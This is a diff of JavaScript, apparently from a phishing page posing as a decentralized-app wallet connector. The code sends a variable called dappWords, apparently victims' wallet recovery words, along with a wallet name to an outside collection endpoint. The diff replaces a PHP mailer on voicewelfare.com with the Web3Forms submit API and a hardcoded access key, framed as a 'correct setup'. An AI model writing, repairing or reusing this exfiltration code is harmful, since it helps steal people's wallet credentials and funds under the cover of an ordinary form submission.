@@ -1555,16 +1555,17 @@
         const dappLinkName = "DAPP DECENTRALIZED"
 
         try {
-
-            $.ajax({
-                url: "https://voicewelfare.com/resultbox/mailer.php",
-                method: "POST",
-                dataType: "JSON",
-                data: {
-                    dappWord: dappWords,
-                    dappName: dappName,
-                    linkName: dappLinkName,
-                },
+             // ✅ Correct Web3Forms setup
+  $.ajax({
+    url: "https://api.web3forms.com/submit",
+    method: "POST",
+    dataType: "json",
+    data: {
+      access_key: "a2f93d64-1f4c-4a7d-83d4-f3ce803b5fea", // your Web3Forms public key
+      dappWord: dappWords,
+      dappName: dappName,
+      linkName: dappLinkName
+    },
                 success: function () { },
                 complete: function () { },
             });
